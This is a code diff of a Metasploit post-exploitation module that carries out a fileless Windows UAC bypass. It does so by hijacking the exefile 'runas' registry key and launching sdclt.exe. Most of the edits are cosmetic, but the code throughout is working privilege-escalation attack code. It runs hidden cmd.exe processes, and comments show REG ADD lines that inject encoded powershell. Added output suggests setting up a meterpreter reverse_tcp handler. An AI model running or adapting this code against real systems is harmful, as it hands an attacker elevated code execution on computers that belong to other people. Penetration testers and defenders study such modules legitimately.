@@ -110,7 +110,7 @@ class MetasploitModule < Msf::Post
 # -----------------------------------------
         def initialize(info={})
                 super(update_info(info,
-                        'Name'          => 'enigma fileless uac bypass [RCE]',
+                        'Name'          => 'enigma fileless uac bypass [sdclt.exe]',
                         'Description'   => %q{
                                         Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe insted of powershell.exe (OJ msf module). This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the EXEC_COMMAND parameter, and runs sdclt.exe (hijacking the process being started to gain code execution).
                         },
@@ -121,7 +121,7 @@ class MetasploitModule < Msf::Post
                                         'Vuln discover : enigma0x3 | mattifestation', # credits
                                 ],
  
-                        'Version'        => '$Revision: 1.0',
+                        'Version'        => '$Revision: 1.1',
                         'DisclosureDate' => 'mar 17 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
@@ -192,9 +192,9 @@ end
   psh_comma = "#{psh_lpath} -nop -wind hidden -Exec Bypass -noni -enc" # use_powershell advanced option command
   uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
   # check for proper config settings enter
-  # to prevent 'unset all' from deleting default options...
+  # to prevent 'unset all' from deleting default options ..
   if datastore['EXEC_COMMAND'] == 'nil'
-    print_error("Options not configurated correctly...")
+    print_error("Options not configurated correctly ..")
     print_warning("Please set EXEC_COMMAND option!")
     return nil
   else
@@ -203,7 +203,7 @@ end
   end
 chec_hive
     # search in target regedit if eventvwr calls mmc.exe
-    print_warning("Reading process registry hive keys...")
+    print_warning("Reading process registry hive keys ..")
     Rex::sleep(1.0)
     if registry_enumkeys("HKCU\\Software\\Classes\\exefile\\shell\\runas\\command")
       print_good(" exec => remote registry hive key found!")
@@ -211,7 +211,7 @@ chec_hive
     else
       # registry hive key not found, aborting module execution.
       print_warning("Hive key: HKCU\\Software\\Classes\\exefile\\shell\\runas\\command (mmc.exe call)")
-      print_error("[ABORT]: module cant find the registry hive key needed...")
+      print_error("[ABORT]: module cant find the registry hive key needed ..")
       print_error("System does not appear to be vulnerable to the exploit code!")
       print_line("")
       Rex::sleep(1.0)
@@ -223,7 +223,7 @@ chec_hive
       # a dword:2 value it means 'always notify' setting is active.
       if check_success == 2
         print_warning("Target UAC set to: #{check_success} (always notify)")
-        print_error("[ABORT]: module can not work under this condictions...")
+        print_error("[ABORT]: module can not work under this condictions ..")
         print_error("Remote system its not vulnerable to the exploit code!")
         print_line("")
         Rex::sleep(1.0)
@@ -231,7 +231,7 @@ chec_hive
       # a dword:nil value it means that we are running againts a 'non-uac-system'
       elsif check_success.nil?
         print_warning("UAC DWORD DATA EMPTY (NON-UAC-SYSTEM?)")
-        print_error("[ABORT]: module can not work under this condictions...")
+        print_error("[ABORT]: module can not work under this condictions ..")
         print_error("Remote system its not vulnerable to the exploit code!")
         print_line("")
         Rex::sleep(1.0)
@@ -256,21 +256,24 @@ chec_hive
           Rex::sleep(1.0)
         end
 
- # Execute process hijacking in registry (cmd.exe OR powershell.exe)...
+ # Execute process hijacking in registry (cmd.exe OR powershell.exe) ..
  # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -nop -enc aDfSjRnGlsgVkGftmoEdD==" /f
  # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "c:\windows\System32\cmd.exe /c start notepad.exe" /f
- print_good(" exec => Hijacking process to gain code execution...")
+ print_good(" exec => Hijacking process to gain code execution ..")
  r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit 'enigma0x3' :D
  Rex::sleep(4.5)
 
       # start remote service to gain code execution
-      print_good(" exec => Starting #{vul_serve} native process...")
+      print_good(" exec => Starting #{vul_serve} native process ..")
       r = session.sys.process.execute("cmd.exe /c start #{vul_serve} /KickOffElev", nil, {'Hidden' => true, 'Channelized' => true})
       Rex::sleep(1.0)
 
     # close channel when done
     print_status("UAC-RCE Credits: enigma0x3 + @mattifestation")
+    print_warning("execute: handler -P port -H host -p windows/meterpreter/reverse_tcp")
+    print_warning("execute: shell")
+    print_warning("execute: start #{vul_serve} /KickOffElev")
     print_line("")
     r.channel.close
     r.close
@@ -290,22 +293,23 @@ def ls_stage2
 
   r=''
   session = client
+  vul_serve = datastore['VUL_SOFT'] # vulnerable soft to be hijacked
   vul_value = "isolatedCommand" # vulnerable reg value to create
   chec_hive = "HKCU\\Software\\Classes\\exefile\\shell\\runas\\command" # registry hive key to be hijacked
   reg_clean = "REG DELETE HKCU\\Software\\Classes\\exefile\\shell\\runas\\command /v #{vul_value} /f" # registry hive to be clean
   # check for proper config settings enter
-  # to prevent 'unset all' from deleting default options...
+  # to prevent 'unset all' from deleting default options ..
   if datastore['DEL_REGKEY'] == 'nil'
-    print_error("Options not configurated correctly...")
+    print_error("Options not configurated correctly ..")
     print_warning("Please set DEL_REGKEY option!")
     return nil
   else
-    print_status("Revert binary.exe process hijack!")
+    print_status("Revert #{vul_serve} process hijack!")
     Rex::sleep(1.5)
   end
 
     # search in target regedit if hijacking method allready exists
-    print_warning("Reading process registry hive keys...")
+    print_warning("Reading process registry hive keys ..")
     Rex::sleep(1.0)
     if registry_getvaldata("#{chec_hive}","#{vul_value}")
       print_good(" exec => Remote registry hive key found!")
@@ -313,15 +317,15 @@ def ls_stage2
     else
        # registry hive key not found, aborting module execution.
        print_warning("Hive key: HKCU\\Software\\Classes\\exefile\\shell\\runas\\command isolatedCommand")
-       print_error("[ABORT]: module cant find the registry hive key needed...")
+       print_error("[ABORT]: module cant find the registry hive key needed ..")
        print_line("")
        Rex::sleep(1.0)
        return nil
     end
 
- # Delete hijacking hive keys from target regedit...
+ # Delete hijacking hive keys from target regedit ..
  # REG DELETE HKCU\Software\Classes /f -> mscfile\shell\open\command
- print_good(" exec => Deleting HKCU hive registry keys...")
+ print_good(" exec => Deleting HKCU hive registry keys ..")
  r = session.sys.process.execute("cmd.exe /c #{reg_clean}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit
  Rex::sleep(3.0)
@@ -362,9 +366,9 @@ def ls_stage3
   vuln_key = "HKCU\\Software\\Classes\\exefile\\shell\\runas\\command" # vuln hijack key
   uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
   # check for proper config settings enter
-  # to prevent 'unset all' from deleting default options...
+  # to prevent 'unset all' from deleting default options ..
   if datastore['CHECK_VULN'] == 'nil'
-    print_error("Options not configurated correctly...")
+    print_error("Options not configurated correctly ..")
     print_warning("Please set CHECK_VULN option!")
     return nil
   else
@@ -372,14 +376,14 @@ def ls_stage3
     Rex::sleep(1.5)
   end
 
-    print_warning("Reading process registry hive keys...")
+    print_warning("Reading process registry hive keys ..")
     Rex::sleep(2.0)
     # check target registry hive/key settings (hijacking key)
     if registry_getvaldata("#{vuln_key}","#{vul_value}")
-      report_tw = "HIJACK HIVE ACTIVE"
+      report_tw = "HIJACK KEY ACTIVE"
     else
       vuln_key = "NOT FOUND"
-      report_tw = "HIJACK HIVE NOT PRESENT"
+      report_tw = "HIJACK KEY NOT PRESENT"
     end
 
     # check target registry hive/key settings (UAC level settings)
@@ -401,7 +405,7 @@ def ls_stage3
       end
 
     print_line("")
-    # display target registry settings to user...
+    # display target registry settings to user ..
     # i hope you are smart enouth to recognise a vulnerable output :D
     print_line("VULNERABLE_SOFT : #{vuln_soft}")
     print_line("    TARGET_OS   : #{oscheck}")
@@ -419,7 +423,7 @@ def ls_stage3
     print_line("           : that allows local/remote-code execution (enigma bypass)")
   else
     print_line("    REPORT : Hijacking method its active, waiting for #{vuln_soft}")
-    print_line("           : execution to run injected string in target machine...")
+    print_line("           : execution to run injected string in target machine ..")
   end
 
 Rex::sleep(1.0)
